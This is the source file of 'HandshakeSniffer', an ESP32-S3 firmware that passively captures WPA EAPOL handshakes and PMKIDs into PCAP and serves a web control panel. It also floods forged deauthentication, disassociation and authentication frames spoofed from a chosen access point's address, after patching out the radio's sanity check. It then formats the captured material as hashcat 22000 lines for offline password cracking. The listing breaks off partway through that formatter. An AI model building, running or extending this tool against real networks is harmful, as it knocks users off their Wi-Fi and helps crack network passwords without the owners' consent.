/*
 ==============================================================
  HandshakeSniffer v1.3 — ESP32-S3 N16R8
  Passive EAPOL / PMKID sniffer with Web UI

  CHANGES FROM v1.2:
    - FIX CRITICAL: AsyncDNSServer replaced with built-in DNSServer
      from ESP32 Arduino core. ESP32Async/AsyncDNSServer does not
      exist (404) — was causing CI fatal clone error.
      processNextRequest() added to loop() for sync polling.
    - FIX: deauth handler — g_deauthRunning never reset if
      xTaskCreatePinnedToCore fails → device stuck in "running"
      state forever, deauth unusable until reboot
    - FIX: deauth handler now checks g_scanBusy — triggering
      deauth while scan_task holds the radio caused a race on
      the WiFi channel and promiscuous state
    - FIX: g_scanBusy reset in scan_task now uses
      __atomic_store_n for consistency with the CAS in /scan
    - FIX: deauth_task also sends auth frames (type 0xB0) to
      force full re-authentication, not just deauth/disassoc —
      some WPA3 APs drop deauth-only floods; auth triggers a
      clean 4-way handshake exchange
    - ADD: /clear endpoint — resets capture buffer + handshake
      state without stopping capture (useful mid-session)
    - ADD: /reset_hs — clears only handshake state (EAPOL msgs,
      PMKID) without discarding the PCAP buffer
    - ADD: burst count 30 + 50 options in UI
    - OPT: deauth_task inner burst loop raised 6→10 frames for
      stronger eviction on busy channels

  CHANGES FROM v1.1:
    - ADD: Captive portal — DNS server intercepts all queries
           and redirects to 192.168.4.1; OS-specific detection
           endpoints for iOS, Android, Windows, macOS

  CHANGES FROM v1.0:
    - FIX: frame_ctrl bit extraction corrected for little-endian
    - FIX: appendFrame uses esp_timer_get_time() (millis() not ISR-safe)
    - FIX: radiotap header with channel field for Wireshark
    - FIX: SSID onclick escape order corrected
    - FIX: dl_pcap snapshots g_capLen under mutex
    - FIX: status endpoint snapshots g_capLen under mutex
    - FIX: /scan double-spawn race eliminated with atomic CAS
    - FIX: scan_task restores target channel on resume
    - FIX: deauth_task saves/restores promisc state correctly
    - FIX: promisc_task replaced busy-wait with ulTaskNotifyTake
    - FIX: buildJSON escapes SSID for valid JSON output
    - FIX: enc label covers WPA2-Enterprise, WPA3, OWE, WAPI
    - OPT: JS log dedup uses Set instead of O(n) array scan
    - OPT: hexStr uses lookup table, no snprintf per byte
    - OPT: logEvent mutex timeout 40ms → 20ms

  HARDWARE:
    Board            : ESP32S3 Dev Module
    Flash Size       : 16MB (128Mb)
    Partition Scheme : Huge APP (3MB No OTA / 1MB SPIFFS)
    PSRAM            : OPI PSRAM
    USB Mode         : Hardware CDC and JTAG
    USB CDC On Boot  : Disabled  ← CRITICAL (boot loop otherwise)
    CPU Frequency    : 240MHz
    NeoPixel pin     : 48

  LIBS (install via build.yml):
    - ESPAsyncWebServer (ESP32Async/ESPAsyncWebServer — git clone)
    - AsyncTCP          (ESP32Async/AsyncTCP          — git clone)
    - DNSServer         (built-in to ESP32 Arduino core — no install)
    - Adafruit NeoPixel (arduino-cli lib install)

  NOTE: ESP32Async/AsyncDNSServer does NOT exist (404).
        Using sync DNSServer from core instead.
        processNextRequest() is called in loop().

  AP:  HandshakeSniffer / password: sniff1234
  UI:  http://192.168.4.1/
 ==============================================================
*/

// ── LED state enum — above includes ──────────────────────────────────────────
enum LedState { LS_OFF, LS_BLUE, LS_GREEN, LS_RED, LS_YELLOW, LS_CYAN, LS_PURPLE };
volatile LedState ledState = LS_BLUE;

#include <Arduino.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_timer.h>
#include <nvs_flash.h>
#include <Preferences.h>
#include <Adafruit_NeoPixel.h>
#include <esp_heap_caps.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/semphr.h>

// ── libnet80211 sanity check override — required for raw TX (deauth) ─────────
extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
  (void)a; (void)b; (void)c; return 0;
}

// ─── CONFIG ──────────────────────────────────────────────────────────────────
#define AP_SSID          "HandshakeSniffer"
#define AP_PASS          "sniff1234"
#define AP_CHANNEL       6
#define WEB_PORT         80
#define LED_PIN          48
#define LED_COUNT        1
#define MAX_TX_POWER     78

// PCAP / capture buffer in PSRAM — 512 KB
#define CAP_BUF_SIZE     (512 * 1024)

// Log ring
#define LOG_MAX          48

// Scan
#define SCAN_MAX_APS     32
#define SEM_TIMEOUT      pdMS_TO_TICKS(3000)

// ─── NEOPIXEL ────────────────────────────────────────────────────────────────
Adafruit_NeoPixel led(LED_COUNT, LED_PIN, NEO_GRB + NEO_KHZ800);

static void setLed(LedState s) { ledState = s; }

void updateLED() {
  static LedState   last   = LS_OFF;
  static uint32_t   tmr    = 0;
  static bool       bright = true;
  LedState          s      = ledState;

  auto pulse = [&](uint32_t on, uint32_t off, uint32_t ms) {
    if (millis() - tmr > ms) { tmr = millis(); bright = !bright; }
    led.setPixelColor(0, bright ? led.Color(on>>16, on>>8&0xFF, on&0xFF)
                                : led.Color(off>>16, off>>8&0xFF, off&0xFF));
    led.show(); last = s;
  };

  if (s == LS_PURPLE) { pulse(0x1C0020, 0x080010, 700); return; }
  if (s == LS_YELLOW) { pulse(0x281C00, 0x0C0800, 300); return; }
  if (s == LS_CYAN)   { pulse(0x002020, 0x000808, 500); return; }
  if (s == last) return;
  last = s;
  switch (s) {
    case LS_BLUE:  led.setPixelColor(0, led.Color(0,0,40));  break;
    case LS_GREEN: led.setPixelColor(0, led.Color(0,40,0));  break;
    case LS_RED:   led.setPixelColor(0, led.Color(40,0,0));  break;
    default:       led.setPixelColor(0, led.Color(0,0,0));   break;
  }
  led.show();
}

// ─── SERIAL LOG ──────────────────────────────────────────────────────────────
#define DBG(f,...)  Serial0.printf("[DBG] "  f "\n", ##__VA_ARGS__)
#define INFO(f,...) Serial0.printf("[INFO] " f "\n", ##__VA_ARGS__)
#define ERR(f,...)  Serial0.printf("[ERR] "  f "\n", ##__VA_ARGS__)

// ─── EVENT LOG (ring, served to UI) ──────────────────────────────────────────
struct LogEntry { uint32_t ts; char msg[96]; };
static LogEntry          g_log[LOG_MAX];
static int               g_logHead  = 0;
static int               g_logCount = 0;
static SemaphoreHandle_t g_logMutex = NULL;

void logEvent(const char* fmt, ...) {
  char tmp[96];
  va_list ap; va_start(ap, fmt); vsnprintf(tmp, sizeof(tmp), fmt, ap); va_end(ap);
  Serial0.printf("[LOG] %s\n", tmp);
  if (!g_logMutex) return;
  // 20ms timeout — this can be called from task context, keep it tight
  if (xSemaphoreTake(g_logMutex, pdMS_TO_TICKS(20)) != pdTRUE) return;
  g_log[g_logHead].ts = millis();
  strncpy(g_log[g_logHead].msg, tmp, 95);
  g_log[g_logHead].msg[95] = '\0';
  g_logHead = (g_logHead + 1) % LOG_MAX;
  if (g_logCount < LOG_MAX) g_logCount++;
  xSemaphoreGive(g_logMutex);
}

// ─── PCAP STRUCTS ────────────────────────────────────────────────────────────
struct __attribute__((packed)) PcapGlobalHdr {
  uint32_t magic;    // 0xa1b2c3d4
  uint16_t vmaj;     // 2
  uint16_t vmin;     // 4
  int32_t  zone;     // 0
  uint32_t sigs;     // 0
  uint32_t snap;     // 65535
  uint32_t net;      // 127 = LINKTYPE_IEEE802_11_RADIOTAP
};
struct __attribute__((packed)) PcapRecHdr {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

// Radiotap header with channel field (present bit 3)
// it_present bit 3 = CHANNEL (freq u16 + flags u16) = 4 bytes
// Total header: 8 (base) + 4 (channel) = 12 bytes, 2-byte aligned
struct __attribute__((packed)) RadiotapHdr {
  uint8_t  it_version; // 0
  uint8_t  it_pad;     // 0
  uint16_t it_len;     // 12
  uint32_t it_present; // 0x00000008 = CHANNEL
  uint16_t chan_freq;  // centre freq in MHz (e.g. 2437 for ch6)
  uint16_t chan_flags; // 0x00C0 = 2GHz + OFDM
};

// Channel number → 2.4GHz centre frequency
static inline uint16_t ch2freq(int ch) {
  if (ch == 14) return 2484;
  return (uint16_t)(2407 + ch * 5);
}

// ─── CAPTURE STATE ────────────────────────────────────────────────────────────
struct HandshakeState {
  bool    m1, m2, m3, m4;
  bool    pmkid;
  uint8_t pmkid_bytes[16];
  uint8_t ap_mac[6];
  uint8_t cli_mac[6];
  uint8_t anonce[32];
  uint8_t snonce[32];
  uint8_t mic[16];
  uint8_t mic_data[128];
  uint16_t mic_data_len;
  uint8_t rsnie[64];
  uint8_t rsnie_len;
};

static uint8_t*          g_capBuf     = nullptr;
static size_t            g_capLen     = 0;
static bool              g_capActive  = false;
static SemaphoreHandle_t g_capMutex   = NULL;

static HandshakeState    g_hs         = {};
static SemaphoreHandle_t g_hsMutex    = NULL;

static uint8_t           g_targetBSSID[6]  = {0};
static int               g_targetChannel   = 0;
static char              g_targetSSID[33]  = "";
static bool              g_filterTarget    = false;

// ─── 802.11 header ───────────────────────────────────────────────────────────
struct __attribute__((packed)) Ieee80211Hdr {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t  addr1[6];
  uint8_t  addr2[6];
  uint8_t  addr3[6];
  uint16_t seq_ctrl;
};

// ─── SCAN RESULTS ────────────────────────────────────────────────────────────
struct APEntry {
  char    ssid[33];
  uint8_t bssid[6];
  int     rssi;
  int     channel;
  int     enc;
};

static APEntry           g_aps[SCAN_MAX_APS];
static int               g_apCount    = 0;
static volatile bool     g_scanBusy   = false;
static SemaphoreHandle_t g_scanMutex  = NULL;
static String            g_scanCache  = "";

// ─── DEAUTH STATE ────────────────────────────────────────────────────────────
static volatile bool     g_deauthRunning = false;
static TaskHandle_t      g_deauthTask    = NULL;
static int               g_deauthBursts  = 5;

// ─── PROMISCUOUS STATE ────────────────────────────────────────────────────────
static volatile bool     g_promiscRunning = false;
static volatile bool     g_promiscPaused  = false;
static TaskHandle_t      g_promiscTask    = NULL;

// ─── WEB SERVER + DNS ─────────────────────────────────────────────────────────
AsyncWebServer server(WEB_PORT);
DNSServer      dns;

// ─── HELPERS ─────────────────────────────────────────────────────────────────
static void mac2str(const uint8_t* m, char* out) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
           m[0],m[1],m[2],m[3],m[4],m[5]);
}
static bool macZero(const uint8_t* m) {
  return !(m[0]|m[1]|m[2]|m[3]|m[4]|m[5]);
}
static bool macEq(const uint8_t* a, const uint8_t* b) {
  return memcmp(a, b, 6) == 0;
}

// Lookup-table hex — no snprintf per byte, ~3x faster
static const char kHex[] = "0123456789abcdef";
static void bytesToHex(const uint8_t* b, int len, char* out) {
  for (int i = 0; i < len; i++) {
    out[i*2]   = kHex[b[i] >> 4];
    out[i*2+1] = kHex[b[i] & 0xF];
  }
  out[len*2] = '\0';
}

// ─── PCAP APPEND ─────────────────────────────────────────────────────────────
// ISR-safe. Uses esp_timer_get_time() — millis() calls xTaskGetTickCount()
// which is NOT safe from a promiscuous RX callback (soft-ISR context).
static void IRAM_ATTR appendFrame(const uint8_t* payload, uint16_t plen, int channel) {
  if (!g_capBuf || !g_capMutex) return;
  BaseType_t woken = pdFALSE;
  if (xSemaphoreTakeFromISR(g_capMutex, &woken) != pdTRUE) return;

  const uint16_t rtap_len = sizeof(RadiotapHdr);
  const uint32_t need     = sizeof(PcapRecHdr) + rtap_len + plen;

  if (g_capLen + need <= CAP_BUF_SIZE) {
    int64_t  us      = esp_timer_get_time();
    uint32_t ts_sec  = (uint32_t)(us / 1000000LL);
    uint32_t ts_usec = (uint32_t)(us % 1000000LL);

    PcapRecHdr rh = { ts_sec, ts_usec, rtap_len + plen, rtap_len + plen };
    RadiotapHdr rt = {
      0, 0, rtap_len, 0x00000008u,
      ch2freq(channel), 0x00C0u   // 2GHz + OFDM
    };
    memcpy(g_capBuf + g_capLen, &rh, sizeof(rh)); g_capLen += sizeof(rh);
    memcpy(g_capBuf + g_capLen, &rt, sizeof(rt)); g_capLen += sizeof(rt);
    memcpy(g_capBuf + g_capLen, payload, plen);   g_capLen += plen;
  }

  xSemaphoreGiveFromISR(g_capMutex, &woken);
  if (woken) portYIELD_FROM_ISR();
}

// ─── EAPOL PARSER ────────────────────────────────────────────────────────────
// frame_ctrl is little-endian on-wire and read as uint16_t on LE CPU:
//   byte 0 (low byte)  = FC byte 0: protocol | type | subtype
//   byte 1 (high byte) = FC byte 1: toDS | fromDS | ... | protected
//
// Bit positions in the full 16-bit LE word:
//   [3:2]  frame type   (bits 3-2 of byte 0)
//   [7:4]  subtype      (bits 7-4 of byte 0)
//   [8]    toDS         (bit 0 of byte 1)
//   [9]    fromDS       (bit 1 of byte 1)
//   [14]   protected    (bit 6 of byte 1)

static const uint16_t EAPOL_MIC_OFFSET    = 65;
static const uint16_t EAPOL_NONCE_OFFSET  = 17;
static const uint16_t EAPOL_KD_LEN_OFFSET = 81;
static const uint16_t EAPOL_KD_OFFSET     = 83;

#define KI_PAIRWISE  (1 << 3)
#define KI_INSTALL   (1 << 6)
#define KI_ACK       (1 << 7)
#define KI_MIC       (1 << 8)
#define KI_SECURE    (1 << 9)

static void parseEAPOL(const uint8_t* dot11, uint16_t plen,
                        const uint8_t* /*src_mac*/, const uint8_t* /*dst_mac*/) {
  const Ieee80211Hdr* hdr = (const Ieee80211Hdr*)dot11;
  uint16_t fc      = hdr->frame_ctrl;       // LE uint16, correct on ESP32
  uint8_t  subtype = (fc >> 4) & 0x0F;     // bits [7:4]
  bool     toDS    = (fc >> 8) & 0x01;     // bit 8
  bool     fromDS  = (fc >> 9) & 0x01;     // bit 9
  bool     encr    = (fc >> 14) & 0x01;    // bit 14 = Protected Frame

  if (encr) return;

  uint16_t hdr_len = (subtype >= 8) ? 26 : 24;  // QoS adds 2 bytes
  if (plen < (uint16_t)(hdr_len + 12)) return;  // need LLC+SNAP+EAPOL header min

  const uint8_t* llc = dot11 + hdr_len;
  if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
  if (llc[6] != 0x88 || llc[7] != 0x8E) return;

  const uint8_t* eapol    = llc + 8;
  uint16_t       eapol_max = plen - hdr_len - 8;
  if (eapol_max < 99) return;

  if (eapol[1] != 3) return;  // not EAPOL-Key
  uint16_t ki       = ((uint16_t)eapol[5] << 8) | eapol[6];
  bool pairwise = (ki & KI_PAIRWISE) != 0;
  bool ack      = (ki & KI_ACK)      != 0;
  bool mic      = (ki & KI_MIC)      != 0;
  bool secure   = (ki & KI_SECURE)   != 0;
  bool install  = (ki & KI_INSTALL)  != 0;

  if (!pairwise) return;

  int msg = 0;
  if ( ack && !mic)                            msg = 1;
  else if (!ack &&  mic && !secure)            msg = 2;
  else if ( ack &&  mic && secure && install)  msg = 3;
  else if (!ack &&  mic && secure && !install) msg = 4;
  if (msg == 0) return;

  // addr3 = BSSID in infrastructure data frames
  const uint8_t* ap_mac  = hdr->addr3;
  const uint8_t* cli_mac = (toDS && !fromDS) ? hdr->addr2 : hdr->addr1;

  if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(10)) != pdTRUE) return;

  if (g_filterTarget && !macZero(g_targetBSSID)) {
    if (!macEq(ap_mac, g_targetBSSID)) {
      xSemaphoreGive(g_hsMutex);
      return;
    }
  }

  if (macZero(g_hs.ap_mac)) {
    memcpy(g_hs.ap_mac,  ap_mac,  6);
    memcpy(g_hs.cli_mac, cli_mac, 6);
  }

  if (msg == 1) {
    g_hs.m1 = true;
    memcpy(g_hs.anonce, eapol + EAPOL_NONCE_OFFSET, 32);

    uint16_t kd_len = ((uint16_t)eapol[EAPOL_KD_LEN_OFFSET] << 8)
                    |             eapol[EAPOL_KD_LEN_OFFSET + 1];
    if (kd_len >= 20 && (EAPOL_KD_OFFSET + kd_len) <= eapol_max) {
      const uint8_t* kd  = eapol + EAPOL_KD_OFFSET;
      uint16_t       pos = 0;
      while (pos + 2 <= kd_len) {
        uint8_t tag  = kd[pos];
        uint8_t tlen = kd[pos + 1];
        if (tlen == 0) break;
        if (tag == 0xDD && tlen >= 18 && pos + 2 + tlen <= kd_len) {
          // PMKID KDE: OUI 00:0F:AC, type 4
          if (kd[pos+2]==0x00 && kd[pos+3]==0x0F &&
              kd[pos+4]==0xAC && kd[pos+5]==0x04) {
            memcpy(g_hs.pmkid_bytes, kd + pos + 6, 16);
            g_hs.pmkid = true;
          }
        }
        pos += 2 + tlen;
      }
    }
  }
  else if (msg == 2) {
    g_hs.m2 = true;
    memcpy(g_hs.snonce, eapol + EAPOL_NONCE_OFFSET, 32);
    memcpy(g_hs.mic,    eapol + EAPOL_MIC_OFFSET,   16);
    uint16_t copy = (eapol_max < 128) ? eapol_max : 128;
    memcpy(g_hs.mic_data, eapol, copy);
    g_hs.mic_data_len = copy;
    uint16_t kd_len = ((uint16_t)eapol[EAPOL_KD_LEN_OFFSET] << 8)
                    |             eapol[EAPOL_KD_LEN_OFFSET + 1];
    if (kd_len > 0 && kd_len <= 64 && (EAPOL_KD_OFFSET + kd_len) <= eapol_max) {
      memcpy(g_hs.rsnie, eapol + EAPOL_KD_OFFSET, kd_len);
      g_hs.rsnie_len = (uint8_t)kd_len;
    }
  }
  else if (msg == 3) { g_hs.m3 = true; }
  else if (msg == 4) { g_hs.m4 = true; }

  xSemaphoreGive(g_hsMutex);

  static const char* mname[] = {"","M1","M2","M3","M4"};
  char ab[18]; mac2str(ap_mac, ab);
  logEvent("EAPOL %s from AP %s", mname[msg], ab);
  if (msg == 1 && g_hs.pmkid) logEvent("PMKID extracted!");
  if (msg == 2)               logEvent("MIC captured — M1+M2 = crackable!");
}

// ─── PROMISCUOUS CALLBACK ────────────────────────────────────────────────────
void IRAM_ATTR promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (g_promiscPaused || !g_capActive) return;
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  uint16_t plen = pkt->rx_ctrl.sig_len;
  if (plen < 24) return;

  const Ieee80211Hdr* hdr = (const Ieee80211Hdr*)pkt->payload;
  uint8_t ftype = (hdr->frame_ctrl >> 2) & 0x03;

  appendFrame(pkt->payload, plen, g_targetChannel);

  if (ftype == 2) {  // Data frame
    parseEAPOL(pkt->payload, plen, hdr->addr2, hdr->addr1);
  }
}

// ─── PROMISC TASK ────────────────────────────────────────────────────────────
// Waits on task notification from stopCapture() instead of busy-polling.
// Stack: 2048 bytes is plenty since this task does almost nothing.
void promisc_task(void* param) {
  INFO("Promisc sniffer up core %d ch %d", xPortGetCoreID(), g_targetChannel);
  // Block indefinitely — stopCapture() sends ulTaskNotify to wake us
  ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
  // Teardown
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  g_promiscTask = NULL;
  vTaskDelete(NULL);
}

void startCapture(int channel, const uint8_t* bssid, const char* ssid, bool filterBSSID) {
  if (g_promiscRunning) return;

  if (g_capMutex && xSemaphoreTake(g_capMutex, SEM_TIMEOUT) == pdTRUE) {
    g_capLen = 0;
    if (g_capBuf) {
      PcapGlobalHdr gh = {0xa1b2c3d4u, 2, 4, 0, 0, 65535, 127};
      memcpy(g_capBuf, &gh, sizeof(gh));
      g_capLen = sizeof(gh);
    }
    xSemaphoreGive(g_capMutex);
  }

  if (g_hsMutex && xSemaphoreTake(g_hsMutex, SEM_TIMEOUT) == pdTRUE) {
    memset(&g_hs, 0, sizeof(g_hs));
    xSemaphoreGive(g_hsMutex);
  }

  g_targetChannel = channel;
  g_filterTarget  = filterBSSID;
  if (bssid) memcpy(g_targetBSSID, bssid, 6);
  else       memset(g_targetBSSID, 0, 6);
  if (ssid)  { strncpy(g_targetSSID, ssid, 32); g_targetSSID[32] = '\0'; }
  else       g_targetSSID[0] = '\0';

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(20);

  g_capActive = true;
  esp_wifi_set_promiscuous_rx_cb(promisc_cb);
  esp_wifi_set_promiscuous(true);
  g_promiscRunning = true;
  g_promiscPaused  = false;

  xTaskCreatePinnedToCore(promisc_task, "promisc", 2048, NULL, 1, &g_promiscTask, 1);
  setLed(LS_CYAN);

  char bstr[18] = "(all)";
  if (bssid && !macZero(bssid)) mac2str(bssid, bstr);
  logEvent("Capture started: ch%d  target=%s  filter=%d", channel, bstr, filterBSSID ? 1 : 0);
}

void stopCapture() {
  if (!g_promiscRunning) return;
  g_capActive      = false;
  g_promiscRunning = false;
  g_promiscPaused  = false;

  // Wake the promisc task so it can clean up promiscuous mode itself
  if (g_promiscTask) {
    xTaskNotifyGive(g_promiscTask);
    // Give it 100ms to tear down before we continue
    vTaskDelay(pdMS_TO_TICKS(100));
  } else {
    // Task was never created or already exited; clean up here
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
  }

  // Restore AP channel
  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  setLed(LS_GREEN);
  logEvent("Capture stopped. Bytes=%u M1=%d M2=%d M3=%d M4=%d PMKID=%d",
           (unsigned)g_capLen,
           g_hs.m1?1:0, g_hs.m2?1:0, g_hs.m3?1:0, g_hs.m4?1:0, g_hs.pmkid?1:0);
}

// ─── DEAUTH TASK ─────────────────────────────────────────────────────────────
void deauth_task(void* param) {
  char bstr[18]; mac2str(g_targetBSSID, bstr);
  logEvent("Deauth: %s ch%d x%d bursts", bstr, g_targetChannel, g_deauthBursts);
  setLed(LS_RED);

  // Save promisc state — may not have been capturing when deauth was triggered
  bool wasCapturing = g_capActive;
  bool wasRunning   = g_promiscRunning;

  if (wasRunning) {
    g_promiscPaused = true;
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    vTaskDelay(pdMS_TO_TICKS(5));
  }

  const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

  // Deauth frame — reason 7 (Class 3 received)
  uint8_t frame[26] = {};
  frame[0] = 0xC0; frame[1] = 0x00;
  frame[2] = 0x3A; frame[3] = 0x01;
  memcpy(frame +  4, bcast,         6);
  memcpy(frame + 10, g_targetBSSID, 6);
  memcpy(frame + 16, g_targetBSSID, 6);
  frame[24] = 0x07; frame[25] = 0x00;

  // Disassoc frame — reason 8 (STA left BSS)
  uint8_t disassoc[26]; memcpy(disassoc, frame, 26);
  disassoc[0] = 0xA0;
  disassoc[24] = 0x08;

  // Auth frame — sends an unsolicited authentication to force re-association
  // Some WPA3 APs and robust PMF-enabled APs ignore deauth-only floods;
  // a broadcast auth triggers a fresh 4-way EAPOL handshake from scratch.
  uint8_t auth[30] = {};
  auth[0] = 0xB0; auth[1] = 0x00;       // Auth type
  auth[2] = 0x3A; auth[3] = 0x01;       // duration
  memcpy(auth +  4, bcast,         6);   // DA = broadcast
  memcpy(auth + 10, g_targetBSSID, 6);   // SA = AP BSSID
  memcpy(auth + 16, g_targetBSSID, 6);   // BSSID
  auth[24] = 0x00; auth[25] = 0x00;     // Algorithm: open
  auth[26] = 0x01; auth[27] = 0x00;     // Sequence: 1
  auth[28] = 0x00; auth[29] = 0x00;     // Status: success

  for (int burst = 0; burst < g_deauthBursts && g_deauthRunning; burst++) {
    for (int i = 0; i < 10; i++) {      // 10 frames per burst (was 6)
      esp_wifi_80211_tx(WIFI_IF_AP,  frame,    26, true);
      esp_wifi_80211_tx(WIFI_IF_STA, frame,    26, true);
      esp_wifi_80211_tx(WIFI_IF_AP,  disassoc, 26, true);
      esp_wifi_80211_tx(WIFI_IF_STA, disassoc, 26, true);
      esp_wifi_80211_tx(WIFI_IF_AP,  auth,     30, true);
      esp_wifi_80211_tx(WIFI_IF_STA, auth,     30, true);
      ets_delay_us(100);
    }
    vTaskDelay(pdMS_TO_TICKS(80));
  }

  // Restore promisc if it was active
  if (wasRunning) {
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    g_promiscPaused = false;
  }

  g_deauthRunning = false;
  g_deauthTask    = NULL;
  setLed(wasCapturing ? LS_CYAN : LS_GREEN);
  logEvent("Deauth burst done — waiting for EAPOL...");
  vTaskDelete(NULL);
}

// ─── SCAN TASK ───────────────────────────────────────────────────────────────
void scan_task(void* param) {
  bool wasCapturing = g_capActive;
  int  savedChannel = g_targetChannel;  // save before scan clobbers radio

  if (wasCapturing) {
    g_capActive     = false;
    g_promiscPaused = true;
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    vTaskDelay(pdMS_TO_TICKS(50));
  }

  int n = WiFi.scanNetworks(false, true, false, 300);

  // Restore to the right channel:
  // If we were capturing on a target channel, go back there.
  // Otherwise restore AP_CHANNEL so the management AP stays reachable.
  int restoreChannel = wasCapturing ? savedChannel : AP_CHANNEL;
  esp_wifi_set_channel(restoreChannel, WIFI_SECOND_CHAN_NONE);
  vTaskDelay(pdMS_TO_TICKS(20));

  if (wasCapturing) {
    g_capActive     = true;
    g_promiscPaused = false;
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
  }

  // Build scan results HTML
  String html = "";
  if (n <= 0) {
    html = "<tr><td colspan='7' style='text-align:center;color:#888;padding:20px'>No networks found</td></tr>";
  } else {
    if (g_scanMutex && xSemaphoreTake(g_scanMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
      g_apCount = (n > SCAN_MAX_APS) ? SCAN_MAX_APS : n;
      for (int i = 0; i < g_apCount; i++) {
        uint8_t* bssid = WiFi.BSSID(i);
        if (!bssid) { g_apCount--; i--; n--; continue; }
        strncpy(g_aps[i].ssid, WiFi.SSID(i).c_str(), 32);
        g_aps[i].ssid[32] = '\0';
        memcpy(g_aps[i].bssid, bssid, 6);
        g_aps[i].rssi    = WiFi.RSSI(i);
        g_aps[i].channel = WiFi.channel(i);
        g_aps[i].enc     = (int)WiFi.encryptionType(i);
      }
      xSemaphoreGive(g_scanMutex);
    }

    for (int i = 0; i < n && i < SCAN_MAX_APS; i++) {
      char bstr[18];
      mac2str(g_aps[i].bssid, bstr);
      int  rssi = g_aps[i].rssi;
      int  ch   = g_aps[i].channel;

      // Full encryption label coverage
      const char* enc;
      switch (g_aps[i].enc) {
        case WIFI_AUTH_OPEN:          enc = "Open";    break;
        case WIFI_AUTH_WEP:           enc = "WEP";     break;
        case WIFI_AUTH_WPA_PSK:       enc = "WPA";     break;
        case WIFI_AUTH_WPA2_PSK:      enc = "WPA2";    break;
        case WIFI_AUTH_WPA_WPA2_PSK:  enc = "WPA/2";   break;
        case WIFI_AUTH_WPA2_ENTERPRISE: enc = "WPA2-E"; break;
        case WIFI_AUTH_WPA3_PSK:      enc = "WPA3";    break;
        case WIFI_AUTH_WPA2_WPA3_PSK: enc = "WPA2/3";  break;
        case WIFI_AUTH_WAPI_PSK:      enc = "WAPI";    break;
        case WIFI_AUTH_OWE:           enc = "OWE";     break;
        default:                      enc = "WPA2";    break;
      }

      String col  = rssi > -50 ? "#0f9d58" : (rssi > -70 ? "#f4b400" : "#db4437");
      String bars = rssi > -50 ? "▮▮▮▮" : (rssi > -60 ? "▮▮▮" : (rssi > -70 ? "▮▮" : "▮"));
      String disp = strlen(g_aps[i].ssid) ? String(g_aps[i].ssid) : "<i style='color:#888'>[Hidden]</i>";

      // Escape order: backslash FIRST, then apostrophe (otherwise \' → \\')
      String ssidEsc = String(g_aps[i].ssid);
      ssidEsc.replace("\\", "\\\\");
      ssidEsc.replace("'",  "\\'");

      html += "<tr>"
        "<td>" + String(i+1) + "</td>"
        "<td>" + disp + "</td>"
        "<td style='font-family:monospace;font-size:11px'>" + String(bstr) + "</td>"
        "<td>" + ch + "</td>"
        "<td style='color:" + col + "'>" + rssi + " " + bars + "</td>"
        "<td>" + enc + "</td>"
        "<td><button class='btn-sel' onclick=\"selectTarget('" + String(bstr) + "'," + ch + ",'" + ssidEsc + "')\">Select</button></td>"
        "</tr>";
    }
  }
  WiFi.scanDelete();

  if (g_scanMutex && xSemaphoreTake(g_scanMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
    g_scanCache = html;
    xSemaphoreGive(g_scanMutex);
  }
  // Atomic store — consistent with the CAS in /scan handler
  __atomic_store_n((bool*)&g_scanBusy, false, __ATOMIC_SEQ_CST);
  logEvent("Scan done: %d APs", n > 0 ? n : 0);
  vTaskDelete(NULL);
}

// ─── HASHCAT 22000 BUILDER ────────────────────────────────────────────────────
String build22000() {
  if (xSemaphoreTake(g_hsMutex, SEM_TIMEOUT) != pdTRUE) return "";
  HandshakeState hs = g_hs;
  xSemaphoreGive(g_hsMutex);

  // Lookup-table hex helper — no per-byte snprintf
  auto hexStr = [](const uint8_t* b, int len) -> String {
    String s; s.reserve(len * 2);
    char pair[3]; pair[2] = '\0';
    for (int i = 0; i < len; i++) {
      pair[0] = kHex[b[i] >> 4];
      pair[1] = kHex[b[i] & 0xF];
      s += pair;
    }
    return s;
  };

  char ap[13], cli[13];
  snprintf(ap,  13, "%02x%02x%02x%02x%02x%02x",
    hs.ap_mac[0],hs.ap_mac[1],hs.ap_mac[2],
    hs.ap_mac[3],hs.ap_mac[4],hs.ap_mac[5]);
  snprintf(cli, 13, "%02x%02x%02x%02x%02x%02x",
    hs.cli_mac[0],hs.cli_mac[1],hs.cli_mac[2],
    hs.cli_mac[3],hs.cli_mac[4],hs.cli_mac[5]);

  // SSID → hex
  char ssidHexBuf[65]; // max 32 bytes → 64 hex chars + NUL
  int  ssidLen = 0;
  while (g_targetSSID[ssidLen] && ssidLen < 32) ssidLen++;
  bytesToHex((const uint8_t*)g_targetSSID, ssidLen, ssidHexBuf);
  String ssidHex = String(ssidHexBuf);

  String out = "";

  if (hs.pmkid && !macZero(hs.ap_mac)) {
    out += "WPA*01*";
    out += hexStr(hs.pmkid_bytes, 16);
    out += "*" + String(ap);
